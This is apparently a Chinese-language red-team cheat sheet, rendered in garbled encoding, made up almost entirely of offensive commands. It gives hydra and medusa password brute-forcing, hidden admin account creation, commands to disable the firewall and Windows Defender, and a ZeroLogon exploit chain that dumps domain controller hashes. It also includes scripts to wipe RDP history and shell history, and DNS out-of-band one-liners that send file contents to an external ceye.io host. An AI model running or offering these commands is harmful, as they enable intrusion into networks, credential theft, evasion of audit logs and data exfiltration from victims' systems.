<p>æ–°å¢ç”¨æˆ·å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://gist.github.com/tacettin/8182358">https://gist.github.com/tacettin/8182358</a></p>
<h2 id="æ‰¾å¯å†™ç›®å½•"><a href="#æ‰¾å¯å†™ç›®å½•" class="headerlink" title="æ‰¾å¯å†™ç›®å½•"></a>æ‰¾å¯å†™ç›®å½•</h2><pre><code>### linux
#### åœ¨/root  waræ–‡ä»¶çš„åŒç›®å½•ä¸‹
å†™
find /root -name war|while read file;do sh -c &quot;echo $file&quot;&gt;$(dirname $file)/finddir.txt;done
åˆ 
find /root -name war|while read file;do sh -c &quot;rm $(dirname $file)/finddir.txt&quot;;done

#### åœ¨/root  waræ–‡ä»¶å¤¹ä¸‹
å†™
find /root -name war|while read file;do sh -c &quot;echo $file&quot;&gt;$file/finddir.txt;done
åˆ 
find /root -name war|while read file;do sh -c &quot;rm $file/finddir.txt&quot;;done

### windows
#### åœ¨C:\Users\liulangmao\Desktopä»»æ„å­ç›®å½•  war.txtæ–‡ä»¶çš„åŒç›®å½•ä¸‹
å†™
for /f %i in (&#39;dir /s /b C:\Users\liulangmao\Desktop\war.txt&#39;) do (echo %i &gt; %i\..\finddir.txt)
åˆ 
for /f %i in (&#39;dir /s /b C:\Users\liulangmao\Desktop\war.txt&#39;) do (del %i\..\finddir.txt)

#### åœ¨C:\Users\liulangmao\Desktopä»»æ„å­ç›®å½•  waræ–‡ä»¶å¤¹ä¸‹
å†™
for /f %i in (&#39;dir /s /b C:\Users\liulangmao\Desktop\war&#39;) do (echo %i &gt; %i\finddir.txt)
åˆ 
for /f %i in (&#39;dir /s /b C:\Users\liulangmao\Desktop\war&#39;) do (del %i\finddir.txt)
</code></pre>
<p>ç¤ºä¾‹ï¼šåœ¨weblogicé¶æœº&#x2F;root æ‰€æœ‰waræ–‡ä»¶å¤¹ä¸‹çš„finddir.txtæ–‡ä»¶ä¸­å†™å…¥è¯¥waræ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚</p>
<pre><code>find /root -name war|while read file;do sh -c &quot;echo $file&quot;&gt;$file/finddir.txt;done
</code></pre>
<p> ç¨‹åºåæ‰¾å¯åŠ¨è·¯å¾„</p>
<pre><code>wmic process where name=&#39;mysqld.exe&#39; get processid,executablepath,name
</code></pre>
<p>ç¨‹åºpidæ‰¾è·¯å¾„</p>
<pre><code>wmic process get name,executablepath,processid|findstr pid
</code></pre>
<p>å¯åŠ¨è·¯å¾„æ‰¾login.jsp</p>
<pre><code>for /f %i in (&#39;dir /s /b D:\UFGOV\U8\login.jsp&#39;) do (echo %i)
</code></pre>
<p>base64åˆ†æ®µä¸æ¢è¡Œè¿½åŠ å†™æ–‡ä»¶</p>
<pre><code>echo|set /p=\&quot;PCFET0NUWVBFIGh0bWw+IDxodG1sPiA8aGVhZD4gPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+PGgxPjIwMjHlubR4eHjnvZHnu5zlronlhajlrp7miJjmvJTnu4M8L2gxPg==\&quot; &gt; D:\UFGOV\U8\webapps\demonstrate.txt
</code></pre>
<p>è§£å†³cmdæ— å›æ˜¾é—®é¢˜</p>
<pre><code>powershell Get-ChildItem C:
</code></pre>
<h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><pre><code>å‚æ•°ï¼š
-l æŒ‡å®šçš„ç”¨æˆ·å -L ç”¨æˆ·åå­—å…¸
-p æŒ‡å®šå¯†ç  -P å¯†ç å­—å…¸
-s æŒ‡å®šç«¯å£ 
-o è¾“å‡ºæ–‡ä»¶
-t ä»»åŠ¡æ•°é»˜è®¤16
-f çˆ†ç ´æˆåŠŸä¸€ä¸ªå°±åœæ­¢
-v æŠ¥é”™æ—¥å¿—è¯¦ç»† -V æ”»å‡»æ—¥å¿—
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 smb -vV
&gt;hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10
</code></pre>
<h2 id="medusa"><a href="#medusa" class="headerlink" title="medusa"></a>medusa</h2><pre><code>å‚æ•°ï¼š
-h ç›®æ ‡åæˆ–IP  -H ç›®æ ‡åˆ—è¡¨
-u ç”¨æˆ·å -U ç”¨æˆ·åå­—å…¸
-p å¯†ç  -P å¯†ç å­—å…¸ -f çˆ†ç ´æˆåŠŸåœæ­¢ -M æŒ‡å®šæœåŠ¡ -t çº¿ç¨‹
-n æŒ‡å®šç«¯å£ -e ns å°è¯•ç©ºå¯†ç å’Œç”¨æˆ·åå¯†ç ç›¸åŒ
&gt;medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql
&gt;medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql
</code></pre>
<h2 id="pythonäº¤äº’shell"><a href="#pythonäº¤äº’shell" class="headerlink" title="pythonäº¤äº’shell"></a>pythonäº¤äº’shell</h2><p>py3</p>
<pre><code>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
</code></pre>
<p>py2</p>
<pre><code>python2 -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;

python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
</code></pre>
<p>ç”¨å®Œè®°å¾—æ¸…è®°å½•</p>
<pre><code>history -c
</code></pre>
<h2 id="æ— äº¤äº’æ·»åŠ ç”¨æˆ·"><a href="#æ— äº¤äº’æ·»åŠ ç”¨æˆ·" class="headerlink" title="æ— äº¤äº’æ·»åŠ ç”¨æˆ·"></a>æ— äº¤äº’æ·»åŠ ç”¨æˆ·</h2><pre><code>useradd newuser;echo &quot;newuser:password&quot;|chpasswd
</code></pre>
<pre><code>useradd -p `openssl passwd 123456` guest
</code></pre>
<pre><code>useradd -p &quot;$(openssl passwd 123456)&quot; guest
</code></pre>
<pre><code>useradd newuwer;echo -e &quot;123456\n123456\n&quot; |passwd newuser
</code></pre>
<h3 id="windowsæ·»åŠ ç”¨æˆ·"><a href="#windowsæ·»åŠ ç”¨æˆ·" class="headerlink" title="windowsæ·»åŠ ç”¨æˆ·"></a>windowsæ·»åŠ ç”¨æˆ·</h3><pre><code>net user admin$ Afabab@20 /add
net localgroup administrators admin$ /add

net user guest /active:yes
net localgroup administrators guest /add

Net localgroup Administrators kent /add /domain å°†åŸŸç”¨æˆ·æ·»åŠ åˆ°åŸŸç®¡ç†å‘˜ç»„

Net localgroup Administrators /add test\kent å°†åŸŸç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„
</code></pre>
<h2 id="Windowsé˜²ç«å¢™"><a href="#Windowsé˜²ç«å¢™" class="headerlink" title="Windowsé˜²ç«å¢™"></a>Windowsé˜²ç«å¢™</h2><pre><code>é€šè¿‡æœåŠ¡å…³é—­
sc \\192.168.93.10 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;
sc \\192.168.93.10 start unablefirewall

å…³é—­é˜²ç«å¢™

netsh firewall set opmode mode=disable

æ”¾è¡Œè¿œç¨‹8888ç«¯å£è¿›æ¥çš„æµé‡
netsh advfirewall firewall add rule name=&quot;88&quot; protocol=TCP dir=in remoteport=8888 action=allow

æ”¾è¡Œå‡ºå»åˆ°è¿œç¨‹8888ç«¯å£çš„æµé‡
netsh advfirewall firewall add rule name=&quot;88&quot; protocol=TCP dir=out remoteport=8888 action=allow

æ”¾è¡Œæœ¬åœ°4444ç«¯å£å‡ºå»çš„æµé‡
netsh advfirewall firewall add rule name=&quot;44&quot; protocol=TCP dir=out localport=4444 action=allow

æ”¾è¡Œä»æœ¬åœ°4444ç«¯å£è¿›æ¥çš„æµé‡
netsh advfirewall firewall add rule name=&quot;44&quot; protocol=TCP dir=in localport=4444 action=allow

åˆ é™¤è§„åˆ™
netsh advfirewall firewall delete rule name=&quot;88&quot;

æŸ¥çœ‹é˜²ç«å¢™é…ç½®(å¯çœ‹åˆ°å…·ä½“è§„åˆ™ç­‰é…ç½®)
netsh firewall show config

å…³é—­windefebd
net stop windefend

netsh firewall set portopening TCP 445 ENABLE //æ‰“å¼€445ç«¯å£    
netsh firewall set portopening TCP 3389 ENABLE //å¼€æ”¾ç»ˆç«¯  
netsh firewall delete allowedprogram C:/A.exe //åˆ é™¤æ”¾è¡Œç¨‹åºA.exe   
netsh firewall set allowedprogram C:/A.exe test ENABLE //æ·»åŠ ç¨‹åºCç›˜ä¸‹çš„A.exeå¹¶æ”¾è¡Œ   
netsh firewall add allowedprogram C:/A.exe test ENABLE //æ·»åŠ ç¨‹åºCç›˜ä¸‹çš„A.exeå¹¶æ”¾è¡Œ   

æ–°ç‰ˆæœ¬å‘½ä»¤   

netsh advfirewall firewall add rule name=&quot;test&quot; dir=in action=allow program=&quot;C:\windows\temp\update.exe&quot; enable=yes   
netsh advfirewall firewall add rule name=&quot;test&quot; dir=out action=allow program=&quot;C:\windows\temp\update.exe&quot; enable=yes   
</code></pre>
<p>ç«¯å£è½¬å‘<br>æŠŠæœ¬åœ°çš„ 801 ç«¯å£è½¬å‘åˆ°è¿œç¨‹çš„ 172.23.80.14 çš„ 80 ç«¯å£</p>
<pre><code>netsh interface portproxy add v4tov4 listenport=801 connectport=80 connectaddress=172.23.80.14
</code></pre>
<p>iptables æ”¾è¡Œ  </p>
<pre><code>iptables -A INPUT -p tcp --dport 80 -j ACCEPT
</code></pre>
<h2 id="frpå¸¸ç”¨é…ç½®"><a href="#frpå¸¸ç”¨é…ç½®" class="headerlink" title="frpå¸¸ç”¨é…ç½®"></a>frpå¸¸ç”¨é…ç½®</h2><p>frpc.ini</p>
<pre><code>[common]
server_addr = xxxxxx
server_port = 7000

[rdp]
type = tcp
local_port = 3389
remote_port = 3389

[plugin_http_proxy]
type = tcp
remote_port = 10801
plugin = http_proxy

[plugin_socks5]
type = tcp
remote_port = 1080
plugin = socks5
</code></pre>
<h2 id="ZeroLogon"><a href="#ZeroLogon" class="headerlink" title="ZeroLogon"></a>ZeroLogon</h2><ul>
<li>äº§ç”Ÿæ—¥å¿— 4742(åˆ©ç”¨æˆåŠŸ), 5580(åˆ©ç”¨å¤±è´¥) </li>
<li>æµé‡ç‰¹å¾æ˜æ˜¾</li>
<li>ä¼šè¢«avç›´æ¥ç§’</li>
<li>æœ‰å¯èƒ½ä¼šå¯¼è‡´ç›®æ ‡è„±åŸŸ</li>
<li>ä»£ç†ä¸ç¨³ï¼Œå®¹æ˜“å‡ºé—®é¢˜</li>
</ul>
<pre><code> git clone https://github.com/mstxq17/cve-2020-1472.git

 python3 zerologon_tester.py Dc02 172.23.119.120 åŸŸå¤–æ£€æµ‹

 PingCastle.exe --server 172.23.119.120 --scanner zerologon --scmode-dc åŸŸå†…æ£€æµ‹
</code></pre>
<p>æ´æ¸…ç©ºç›®æ ‡åŸŸæ§æœºå™¨è´¦æˆ·å¯†ç </p>
<pre><code>python3 cve-2020-1472-exploit.py Dc02$ 172.23.119.120
</code></pre>
<p>æ— å¯†ç è¿œç¨‹æå– ntds.dit</p>
<pre><code>python3 secretsdump.py qq.local/&#39;Dc02$&#39;@172.23.119.120 -no-pass -outputfile qq.local.ntds.hash
</code></pre>
<p>ç”¨ administrator åŸŸç®¡è´¦æˆ· hash è¿œç¨‹å¯¼å‡ºåŸŸæ§æœºå™¨è´¦æˆ· hash [hex æ ¼å¼]</p>
<pre><code>    python3 secretsdump.py -hashes :ccef208c6485269c20db2cad21734fe7 qq/administrator@172.23.119.120
</code></pre>
<p>ç”¨ä¸Šé¢çš„ hex è¿˜åŸç›®æ ‡åŸŸæ§æœºå™¨è´¦æˆ·å¯†ç </p>
<pre><code>python3 restorepassword.py Dc02@Dc02 -target-ip 172.23.119.120 -hexpass daf1d2acc25d2e54218921737a40d58192b9bcdf089ddbeaf9f7931571b07916f96e2c51d8d00f56d2440c13c0e5586e2dafd1669e37131***
</code></pre>
<h2 id="è·å–æ§åˆ¶å™¨"><a href="#è·å–æ§åˆ¶å™¨" class="headerlink" title="è·å–æ§åˆ¶å™¨"></a>è·å–æ§åˆ¶å™¨</h2><pre><code>net group &quot;domain controllers&quot; /domain

proxychains python3 zerologon_tester.py dc 10.10.10.10

#åˆ©ç”¨expé‡ç½®å¯†ç 

proxychains python3 cve-2020-1472-exploit.py dc 10.10.10.10

# -no-pass dump åŸŸæ§hash

proxychains impacket-secretsdumpÂ  de1ay.com/dc\$@10.10.10.10 -no-pass  

proxychains impacket-wmiexecÂ  Â -hashesÂ  LM:NTLMÂ  Â  ./administrator@10.10.10.10

#æ¢å¤hash
powershell Reset-ComputerMachinePassword

# ä¿å­˜æ³¨å†Œè¡¨


reg save HKLM\SYSTEM system.save  

reg save HKLM\SAM sam.save  

reg save HKLM\SECURITY security.save

#è§£å¯†

python secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

#æ¢å¤å¯†ç 

proxychainsÂ  Â python reinstall_original_pw.py dcÂ  10.10.10.10 ef3ec852436fab1e43a0f480d8dda86268f76aa3731d72d6b262de002e8f6187d412353be5bc762ae983ff52b0741e981c721ef6eba563f5e62cb35bbcb5c8b5d1a113bdc6a5d89635eb0a8913f99c21ec6af2b6dcb40e24bf1b37c4bfa2a2f4a1cee00f1aae67d052f38c0daeeb9ebb72638b6a074fa71d65560c6f0a72d67a45f5bba10181c98e62a661ae743d7e2b7037f3460a9e0587677bb19a6bbbd9e1f7275040bb9bcc821824a1b224568a908fd36d4b84e4c6e31b8d24b0beb584bfdca26288edae0ce73b07ed13523ac31c21ee0a3118d6f1f1169aa6f3e27918322429ad190a5ce3da83bc12cc985be377
</code></pre>
<h2 id="åˆ rdpæ—¥å¿—"><a href="#åˆ rdpæ—¥å¿—" class="headerlink" title="åˆ rdpæ—¥å¿—"></a>åˆ rdpæ—¥å¿—</h2><p>æ¸…é™¤è¿œç¨‹æ¡Œé¢è¿æ¥è®°å½•,åˆ›å»ºclear.bat</p>
<pre><code>@echo off
reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f
reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /f
reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;
cd %userprofile%\documents\attrib Default.rdp -s -h
del Default.rdp
</code></pre>
<h2 id="åˆ webæ—¥å¿—"><a href="#åˆ webæ—¥å¿—" class="headerlink" title="åˆ webæ—¥å¿—"></a>åˆ webæ—¥å¿—</h2><pre><code>/var/log/nginx/  
â€‹  
access.log
error.log  
â€‹  
tomcat ä½äº logs  
catalina.*.log
access_log.*.txt  
</code></pre>
<h2 id="å¼€3389"><a href="#å¼€3389" class="headerlink" title="å¼€3389"></a>å¼€3389</h2><pre><code>æ–¹æ³•ä¸€
wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1
wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1
reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
net start TermService

æ–¹æ³•äºŒ
#è®¾ç½®è¿œç¨‹æ¡Œé¢ç«¯å£
reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f
#å¼€å¯è¿œç¨‹æ¡Œé¢
wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1
#æ£€æŸ¥ç«¯å£çŠ¶æ€
netstat -an|find &quot;3389&quot;
#å…³é—­è¿œç¨‹æ¡Œé¢
wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 0
</code></pre>
<h2 id="æ–‡ä»¶æœç´¢"><a href="#æ–‡ä»¶æœç´¢" class="headerlink" title="æ–‡ä»¶æœç´¢"></a>æ–‡ä»¶æœç´¢</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/245019">https://www.anquanke.com/post/id/245019</a></p>
<pre><code>findstr /s /i /n /d:C:\ /c:&quot;123123&quot; *.txt
</code></pre>
<pre><code>for /r C: %i in (login.*) do @echo %i
</code></pre>
<pre><code>where /R C: login.*
</code></pre>
<pre><code>dir /s/a-d/b login.*
</code></pre>
<pre><code>find / -name index.php
</code></pre>
<pre><code>find / -name index.php
</code></pre>
<pre><code>find / -name &quot;index.php&quot; | xargs grep &quot;111222&quot;
</code></pre>
<pre><code>updatedb &amp;&amp; locate index.php
</code></pre>
<pre><code>è¿›ç¨‹è·¯å¾„
wmic process get name,executablepath
</code></pre>
<h3 id="å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾å¤–å¸¦oob"><a href="#å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾å¤–å¸¦oob" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾å¤–å¸¦oob"></a>å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾å¤–å¸¦oob</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>åœ¨windowså½“ä¸­ï¼Œ%cd% ä»£è¡¨çš„æ˜¯å½“å‰ç›®å½•ï¼Œæˆ‘ä»¬é€šè¿‡echoå°†å½“å‰ç›®å½•å†™å…¥æ–‡æœ¬temp,ç„¶åè£å›½certutilå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œbase64ç¼–ç ï¼Œå†è¿‡æ»¤certutilæºå¸¦çš„å­—ç¬¦ï¼Œå°†å®ƒèµ‹ç»™ä¸€ä¸ªå˜é‡ï¼Œæœ€åé€šè¿‡nslookupå¤–å¸¦å‡ºæ¥ï¼Œä»è€Œå®ç°è·å–å½“å‰ç›®å½•çš„ç›®çš„ã€‚</p>
<pre><code>echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &quot;CERTIFICATE&quot; temp1 &gt; temp2&amp;&amp;set /p ADDR=&lt;temp2&amp;&amp;nslookup %ADDR%.is1lv6.ceye.io
</code></pre>
<p>ä¸‹é¢è¿™ä¸ªè¯­å¥ï¼Œä¸»è¦æ˜¯è¿‡æ»¤ä½œç”¨ã€‚æŠŠhelo.txtæ–‡ä»¶ä¸­çš„â€œ&#x3D;â€è¿‡æ»¤å¹¶é‡æ–°è¾“å‡ºæ–‡ä»¶ã€‚</p>
<pre><code>for /f &quot;delims=^= tokens=1,*&quot; %i in (helo.txt) do (echo %i&gt;&gt;text3.txt)
</code></pre>
<p>ä¸ºä»€ä¹ˆåœ¨ä¸Šé¢éœ€è¦è¿‡æ»¤&#x3D;ï¼Œä¸»è¦æ˜¯å› ä¸ºåœ¨æ‰§è¡Œpingå‘½ä»¤çš„æ—¶å€™æ˜¯ä¸å…è®¸å¸¦&#x3D;å·çš„ï¼Œç›¸è¾ƒäºnslookupï¼Œpingå‘½ä»¤æˆåŠŸç‡ç›¸å¯¹è¾ƒé«˜ï¼Œä½†å¦‚æœè·¯å¾„è¿‡é•¿ï¼Œå¯èƒ½ä¼šå¯¼è‡´å¤±è´¥ã€‚å…·ä½“å¤šé•¿éœ€è¦å¤§å®¶è‡ªè¡Œè¯•éªŒã€‚</p>
<pre><code>echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &quot;CERTIFICATE&quot; temp1 &gt; temp2&amp;&amp;for /f &quot;delims=^= tokens=1,*&quot; %i in (temp2) do (echo %i&gt;&gt;temp3)&amp;&amp;set /p ADDR=&lt;temp3&amp;ping %ADDR%.is1lv6.ceye.io
</code></pre>
<p>å¦‚æœéœ€è¦å¤–å¸¦å¤šè¡Œå‘½ä»¤ï¼Œåˆ™éœ€è¦ä»¥ä¸‹è¯­å¥ï¼š</p>
<pre><code>where /R C: login.* &gt; test &amp;&amp; certutil -encodehex -f test test.hex 4 &amp;&amp; powershell $text=Get-Content test.hex;$sub=$text -replace(&#39; &#39;,&#39;&#39;);$j=11111;foreach($i in $sub)&#123; $fin=$j.tostring()+&#39;.&#39;+$i+&#39;.is1lv6.ceye.io&#39;;$j += 1; nslookup $fin &#125;
</code></pre>
<p>winå¸¸ç”¨å˜é‡</p>
<pre><code>//å˜é‡                     ç±»å‹       æè¿°
//%ALLUSERSPROFILE%        æœ¬åœ°       è¿”å›â€œæ‰€æœ‰ç”¨æˆ·â€é…ç½®æ–‡ä»¶çš„ä½ç½®ã€‚
//%APPDATA%                æœ¬åœ°       è¿”å›é»˜è®¤æƒ…å†µä¸‹åº”ç”¨ç¨‹åºå­˜å‚¨æ•°æ®çš„ä½ç½®ã€‚
//%CD%                     æœ¬åœ°       è¿”å›å½“å‰ç›®å½•å­—ç¬¦ä¸²ã€‚
//%CMDCMDLINE%             æœ¬åœ°       è¿”å›ç”¨æ¥å¯åŠ¨å½“å‰çš„ Cmd.exe çš„å‡†ç¡®å‘½ä»¤è¡Œã€‚
//%CMDEXTVERSION%          ç³»ç»Ÿ       è¿”å›å½“å‰çš„â€œå‘½ä»¤å¤„ç†ç¨‹åºæ‰©å±•â€çš„ç‰ˆæœ¬å·ã€‚
//%COMPUTERNAME%           ç³»ç»Ÿ       è¿”å›è®¡ç®—æœºçš„åç§°ã€‚
//%COMSPEC%                ç³»ç»Ÿ       è¿”å›å‘½ä»¤è¡Œè§£é‡Šå™¨å¯æ‰§è¡Œç¨‹åºçš„å‡†ç¡®è·¯å¾„ã€‚
//%DATE%                   ç³»ç»Ÿ       è¿”å›å½“å‰æ—¥æœŸã€‚ä½¿ç”¨ä¸ date /t å‘½ä»¤ç›¸åŒçš„æ ¼å¼ã€‚ç”± Cmd.exe ç”Ÿæˆã€‚æœ‰å…³ date å‘½ä»¤çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… Dateã€‚
//%ERRORLEVEL%             ç³»ç»Ÿ       è¿”å›ä¸Šä¸€æ¡å‘½ä»¤çš„é”™è¯¯ä»£ç ã€‚é€šå¸¸ç”¨éé›¶å€¼è¡¨ç¤ºé”™è¯¯ã€‚
//%HOMEDRIVE%              ç³»ç»Ÿ       è¿”å›è¿æ¥åˆ°ç”¨æˆ·ä¸»ç›®å½•çš„æœ¬åœ°å·¥ä½œç«™é©±åŠ¨å™¨å·ã€‚åŸºäºä¸»ç›®å½•å€¼è€Œè®¾ç½®ã€‚ç”¨æˆ·ä¸»ç›®å½•æ˜¯åœ¨â€œæœ¬åœ°ç”¨æˆ·å’Œç»„â€ä¸­æŒ‡å®šçš„ã€‚
//%HOMEPATH%               ç³»ç»Ÿ       è¿”å›ç”¨æˆ·ä¸»ç›®å½•çš„å®Œæ•´è·¯å¾„ã€‚åŸºäºä¸»ç›®å½•å€¼è€Œè®¾ç½®ã€‚ç”¨æˆ·ä¸»ç›®å½•æ˜¯åœ¨â€œæœ¬åœ°ç”¨æˆ·å’Œç»„â€ä¸­æŒ‡å®šçš„ã€‚
//%HOMESHARE%              ç³»ç»Ÿ       è¿”å›ç”¨æˆ·çš„å…±äº«ä¸»ç›®å½•çš„ç½‘ç»œè·¯å¾„ã€‚åŸºäºä¸»ç›®å½•å€¼è€Œè®¾ç½®ã€‚ç”¨æˆ·ä¸»ç›®å½•æ˜¯åœ¨â€œæœ¬åœ°ç”¨æˆ·å’Œç»„â€ä¸­æŒ‡å®šçš„ã€‚
//%LOGONSERVER%            æœ¬åœ°       è¿”å›éªŒè¯å½“å‰ç™»å½•ä¼šè¯çš„åŸŸæ§åˆ¶å™¨çš„åç§°ã€‚
//%NUMBER_OF_PROCESSORS%   ç³»ç»Ÿ       æŒ‡å®šå®‰è£…åœ¨è®¡ç®—æœºä¸Šçš„å¤„ç†å™¨çš„æ•°ç›®ã€‚
//%OS%                     ç³»ç»Ÿ       è¿”å›æ“ä½œç³»ç»Ÿåç§°ã€‚Windows 2000 æ˜¾ç¤ºå…¶æ“ä½œç³»ç»Ÿä¸º Windows_NTã€‚
//%PATH%                   ç³»ç»Ÿ       æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„æœç´¢è·¯å¾„ã€‚
//%PATHEXT%                ç³»ç»Ÿ       è¿”å›æ“ä½œç³»ç»Ÿè®¤ä¸ºå¯æ‰§è¡Œçš„æ–‡ä»¶æ‰©å±•åçš„åˆ—è¡¨ã€‚
//%PROCESSOR_ARCHITECTURE% ç³»ç»Ÿ       è¿”å›å¤„ç†å™¨çš„èŠ¯ç‰‡ä½“ç³»ç»“æ„ã€‚å€¼ï¼šx86 æˆ– IA64ï¼ˆåŸºäº Itaniumï¼‰ã€‚
//%PROCESSOR_IDENTFIER%    ç³»ç»Ÿ       è¿”å›å¤„ç†å™¨è¯´æ˜ã€‚
//%PROCESSOR_LEVEL%        ç³»ç»Ÿ       è¿”å›è®¡ç®—æœºä¸Šå®‰è£…çš„å¤„ç†å™¨çš„å‹å·ã€‚
//%PROCESSOR_REVISION%     ç³»ç»Ÿ       è¿”å›å¤„ç†å™¨çš„ç‰ˆæœ¬å·ã€‚
//%P ROMPT%                 æœ¬åœ°       è¿”å›å½“å‰è§£é‡Šç¨‹åºçš„å‘½ä»¤æç¤ºç¬¦è®¾ç½®ã€‚ç”± Cmd.exe ç”Ÿæˆã€‚
//%RANDOM%                 ç³»ç»Ÿ       è¿”å› 0 åˆ° 32767 ä¹‹é—´çš„ä»»æ„åè¿›åˆ¶æ•°å­—ã€‚ç”± Cmd.exe ç”Ÿæˆã€‚
//%SYSTEMDRIVE%            ç³»ç»Ÿ       è¿”å›åŒ…å« Windows server operating system æ ¹ç›®å½•ï¼ˆå³ç³»ç»Ÿæ ¹ç›®å½•ï¼‰çš„é©±åŠ¨å™¨ã€‚
//%SYSTEMROOT%             ç³»ç»Ÿ       è¿”å› Windows server operating system æ ¹ç›®å½•çš„ä½ç½®ã€‚
//%TEMP%å’Œ%TMP%            ç³»ç»Ÿå’Œç”¨æˆ·  è¿”å›å¯¹å½“å‰ç™»å½•ç”¨æˆ·å¯ç”¨çš„åº”ç”¨ç¨‹åºæ‰€ä½¿ç”¨çš„é»˜è®¤ä¸´æ—¶ç›®å½•ã€‚æœ‰äº›åº”ç”¨ç¨‹åºéœ€è¦ TEMPï¼Œè€Œå…¶ä»–åº”ç”¨ç¨‹åºåˆ™éœ€è¦ TMPã€‚
//%TIME%                   ç³»ç»Ÿ       è¿”å›å½“å‰æ—¶é—´ã€‚ä½¿ç”¨ä¸time /tå‘½ä»¤ç›¸åŒçš„æ ¼å¼ã€‚ç”±Cmd.exeç”Ÿæˆã€‚æœ‰å…³timeå‘½ä»¤çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… Timeã€‚
//%USERDOMAIN%             æœ¬åœ°       è¿”å›åŒ…å«ç”¨æˆ·å¸æˆ·çš„åŸŸçš„åç§°ã€‚
//%USERNAME%               æœ¬åœ°       è¿”å›å½“å‰ç™»å½•çš„ç”¨æˆ·çš„åç§°ã€‚
//%USERPROFILE%            æœ¬åœ°       è¿”å›å½“å‰ç”¨æˆ·çš„é…ç½®æ–‡ä»¶çš„ä½ç½®ã€‚
//%WINDIR%                 ç³»ç»Ÿ       è¿”å›æ“ä½œç³»ç»Ÿç›®å½•çš„ä½ç½®ã€‚
</code></pre>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>åœ¨linuxä¸­pwdä¹Ÿæ˜¯æŸ¥çœ‹å½“å‰ç›®å½•çš„ï¼Œæˆ‘ä»¬é€šè¿‡tr -då°†æ¢è¡Œç¬¦å»æ‰å¹¶é€šè¿‡xxd -pså°†å€¼è½¬åŒ–ä¸º16è¿›åˆ¶ï¼Œè¿™æ ·æˆ‘ä»¬å³å¯å¤–å¸¦å‡ºè‡ªå·±æƒ³è¦çš„ä¸œè¥¿ã€‚</p>
<pre><code>ping pwd|tr -d &#39;\n&#39;|xxd -ps.is1lv6.ceye.io
</code></pre>
<p>base64åŸç†å’Œä¸Šé¢ç±»ä¼¼ï¼Œä¸»è¦æ˜¯å¯¹å€¼è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åæ›¿æ¢æ‰â€œ&#x3D;â€ï¼Œå³å¯æˆåŠŸå¤–å¸¦æ•°æ®ã€‚</p>
<pre><code>pingpwd|base64|tr -d â€˜=â€™.is1lv6.ceye.io
</code></pre>
<p>å¦‚æœæœ‰å¤šè¡Œæ•°æ®éœ€è¦å¤–å¸¦ï¼Œé‚£ä¹ˆè¯·è€ƒè™‘ä¸‹é¢çš„è¯­å¥ã€‚</p>
<pre><code>var=11111 &amp;&amp; for b in $(find / -name &quot;index.php&quot; | xargs grep &quot;111222&quot;|xxd -p); do var=$((var+1)) &amp;&amp; dig $var.$b.is1lv6.ceye.io; done
</code></pre>
<h2 id="windowsçŸ­æ–‡ä»¶å"><a href="#windowsçŸ­æ–‡ä»¶å" class="headerlink" title="windowsçŸ­æ–‡ä»¶å"></a>windowsçŸ­æ–‡ä»¶å</h2><p>çŸ­æ–‡ä»¶åæŸ¥çœ‹</p>
<pre><code>ç”¨&quot;dir /x&quot;å‘½ä»¤å¯ä»¥æ–¹ä¾¿åœ°å¸®åŠ©æ‚¨æŸ¥çœ‹ç³»ç»Ÿå¯¹ç›®å½•æˆ–æ–‡ä»¶åçš„ç¼©å†™
</code></pre>
